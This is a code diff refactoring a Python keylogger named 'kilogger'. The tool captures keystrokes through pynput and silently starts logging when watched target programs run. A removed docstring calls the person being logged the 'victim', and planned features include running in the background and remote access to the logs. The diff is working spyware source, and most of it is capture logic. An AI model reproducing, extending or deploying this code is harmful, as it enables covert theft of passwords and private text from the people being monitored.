@@ -18,7 +18,6 @@ is provided "as is" without warranties.
 Author: Antonino Lorenzo
 Version: 1.0.0
 
-TODO [ ]: debug run without arguments
 TODO [ ]: automatically run in background
 TODO [ ]: Implement capture copy to clipboard functionality
 TODO [ ]: Remote access to logs
@@ -32,11 +31,13 @@ import argparse
 import logging
 import logging.config
 from threading import Thread, Event
+from abc import ABC, abstractmethod
 
 from kilogger import (
     LOGLOC,
     CONFIG,
     DEFAULT_TIMEOUT,
+    STOP_RESPONSE,
     install_package,
     verify_package_installation
 )
@@ -78,7 +79,19 @@ class PathParser(argparse.Action):
         setattr(namespace, self.dest, value)
 
 
-class KLogger(Thread):
+class KeyboardManager(ABC):
+    """Interface for BaseManager and WatchingManager."""
+
+    @abstractmethod
+    def run(self):
+        """Runs the logger"""
+
+    @abstractmethod
+    def stop(self):
+        """Stops the logger"""
+
+
+class KeyboardListener(Thread):
     """Wrapper around pynput.keyboard.Listener"""
 
     def __init__(self, *args, **kwargs):
@@ -100,65 +113,58 @@ class KLogger(Thread):
         self.__logger.info(f'> {str(key)}')
 
 
-class KLoggerFactory:
-    """Handles execution of KLogger threads"""
+class BaseManager(KeyboardManager):
+    """Interface to start and stop KeyboardListener threads"""
     def __init__(self):
-        self.__current: KLogger | None = None
+        self.__current: KeyboardListener | None = None
 
-    def start(self):
-        """Starts a new KLogger thread"""
+    def run(self):
+        """Starts a new KeyboardListener thread"""
         if not self.__current:
-            self.__current = KLogger()
+            self.__current = KeyboardListener()
             self.__current.start()
 
     def stop(self):
-        """Stops the current running KLogger thread"""
+        """Stops the current running KeyboardListener thread"""
         if self.__current:
             self.__current.stop()
             self.__current = None
 
 
-class ProcessListener(Thread):
+class WatchingManager(Thread, KeyboardManager):
     """
-    Runs in background until victim executes a program in the "targets" list.
+    Watches specified "--targets" processes and runs a KeyboardListener
+    thread when one of the targets is executed.
     """
     RUNNING = 'Running'
     NOT_RUNNING = 'Not Running'
     STOP = '/terminate'
 
-    def __init__(self, targets: list, factory: KLoggerFactory, *args,
+    STATUS = [
+        (NOT_RUNNING, RUNNING),     # turned on
+        (RUNNING, RUNNING),         # already on
+        (RUNNING, NOT_RUNNING),     # turned off
+        (NOT_RUNNING, NOT_RUNNING)  # already off
+    ]
+
+    def __init__(self, targets: list, factory: BaseManager, *args,
                  sleep: int = 10, **kwargs):
         super().__init__(*args, **kwargs)
 
-        self.__targets = {t: (ProcessListener.NOT_RUNNING, ProcessListener.NOT_RUNNING) for t in targets}
+        self.__targets = {t: WatchingManager.STATUS[3] for t in targets}
         self.__logger_factory = factory
-        self.__logger_status = ProcessListener.NOT_RUNNING
+        self.__logger_status = WatchingManager.NOT_RUNNING
         self.__logger = logging.getLogger('kilogger')
         self.__sleep = sleep
         self.__stop_event = Event()
         self.daemon = True
 
-    def find_process(self):
-        """Updates the status [RUNNING, NOT_RUNNING] of the target processes"""
-        snapshot = [p.name().lower() for p in psutil.process_iter(['name'])]
-        for tr_process in self.__targets.keys():
-            if tr_process in snapshot:
-                # Keep state of the previous state
-                if self.__targets[tr_process][1] == ProcessListener.NOT_RUNNING:
-                    self.__targets[tr_process] = (ProcessListener.NOT_RUNNING, ProcessListener.RUNNING)
-                else:
-                    self.__targets[tr_process] = (ProcessListener.RUNNING, ProcessListener.RUNNING)
-            else:
-                if self.__targets[tr_process][1] == ProcessListener.RUNNING:
-                    self.__targets[tr_process] = (ProcessListener.RUNNING, ProcessListener.NOT_RUNNING)
-                else:
-                    self.__targets[tr_process] = (ProcessListener.NOT_RUNNING, ProcessListener.NOT_RUNNING)
-
     def run(self):
         """
         Checks if the target process is running every `sleep` seconds,
         updates the status [RUNNING, NOT_RUNNING] of the target processes
-        and if one of them is running it starts a KLogger with KLoggerFactory.
+        and if one of them is running it starts a KeyboardListener with
+        BaseListener.
         """
         while True:
             self.find_process()
@@ -167,43 +173,59 @@ class ProcessListener(Thread):
                 if status[0] != status[1]:
                     self.__logger.info(f'{status[1]:#>20}: {tr_process:#<20}')
 
-                if status[1] == ProcessListener.RUNNING:
+                if status[1] == WatchingManager.RUNNING:
                     active_count += 1
 
                 # found target process in running processes => start logging
-                if (status[1] == ProcessListener.RUNNING and
-                        self.__logger_status == ProcessListener.NOT_RUNNING):
-                    self.__logger_status = ProcessListener.RUNNING
-                    self.__logger_factory.start()
+                if (status[1] == WatchingManager.RUNNING and
+                        self.__logger_status == WatchingManager.NOT_RUNNING):
+                    self.__logger_status = WatchingManager.RUNNING
+                    self.__logger_factory.run()
 
             # self.__logger.info(f'[i] Active targets: {active_count}')
             if (active_count == 0 and
-                    self.__logger_status == ProcessListener.RUNNING):
+                    self.__logger_status == WatchingManager.RUNNING):
                 self.__logger_factory.stop()
 
             # wait to re-execute check
             time.sleep(self.__sleep)
 
     def stop(self):
-        """Called when the termination signal is sent to ListenerSocket."""
-        if self.__logger_status == ProcessListener.RUNNING:
+        """Called when the termination signal is sent to SocketListener."""
+        if self.__logger_status == WatchingManager.RUNNING:
             self.__logger_factory.stop()
         self.__stop_event.set()
 
+    def find_process(self):
+        """Updates the status [RUNNING, NOT_RUNNING] of the target processes"""
+        snapshot = [p.name().lower() for p in psutil.process_iter(['name'])]
+        for tr_process in self.__targets.keys():
+            if tr_process in snapshot:
+                # Keep state of the previous state
+                if self.__targets[tr_process][1] == WatchingManager.NOT_RUNNING:
+                    self.__targets[tr_process] = WatchingManager.STATUS[0]
+                else:
+                    self.__targets[tr_process] = WatchingManager.STATUS[1]
+            else:
+                if self.__targets[tr_process][1] == WatchingManager.RUNNING:
+                    self.__targets[tr_process] = WatchingManager.STATUS[2]
+                else:
+                    self.__targets[tr_process] = WatchingManager.STATUS[3]
 
-class ListenerSocket:
+
+class SocketListener:
     """
-    Used to stop ProcessListener.
+    Used to stop a KeyboardManager.
     curl http://127.0.0.1:65432/terminate
     """
     HOST = '127.0.0.1'
     PORT = 65432
 
-    def __init__(self, process_listener: ProcessListener):
-        self.__process_listener = process_listener
+    def __init__(self, manager: KeyboardManager):
+        self.__log_manager = manager
 
         self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.__sock.bind((ListenerSocket.HOST, ListenerSocket.PORT))
+        self.__sock.bind((SocketListener.HOST, SocketListener.PORT))
         self.__sock.listen()
         self.__running = True
 
@@ -225,18 +247,13 @@ class ListenerSocket:
 
                 request = data.decode('utf-8')
                 request_line, headers = request.split('\r\n', 1)
-                if ProcessListener.STOP in request_line:
-                    self.__process_listener.stop()
-                    message = 'Closed'
-                    response = (f"HTTP/1.1 200 OK\r\n"
-                                f"Content-Type: text/plain\r\n"
-                                f"Content-Length: {len(message)}\r\n\r\n{message}")
-                    conn.send(response.encode('utf-8'))
+                if WatchingManager.STOP in request_line:
+                    self.__log_manager.stop()
+                    conn.send(STOP_RESPONSE.encode('utf-8'))
                     conn.close()
                     if self.__sock:
                         self.__running = False
                         self.__sock.close()
-                    break
                 else:
                     conn.close()
         except OSError:
@@ -309,18 +326,18 @@ def main():
         logging.config.dictConfig(CONFIG)
 
         # --- Run logger
-        logger_factory = KLoggerFactory()
+        logger_factory = BaseManager()
         if args.targets:
-            proc_listener = ProcessListener(
+            proc_listener = WatchingManager(
                 args.targets,
                 sleep=DEFAULT_TIMEOUT,
                 factory=logger_factory
             )
             proc_listener.start()
-            ListenerSocket(proc_listener)
+            SocketListener(proc_listener)
         else:
-            # TODO: handle stop maybe with "with"
-            logger_factory.start()
+            logger_factory.run()
+            SocketListener(logger_factory)
 
 
 if __name__ == "__main__":
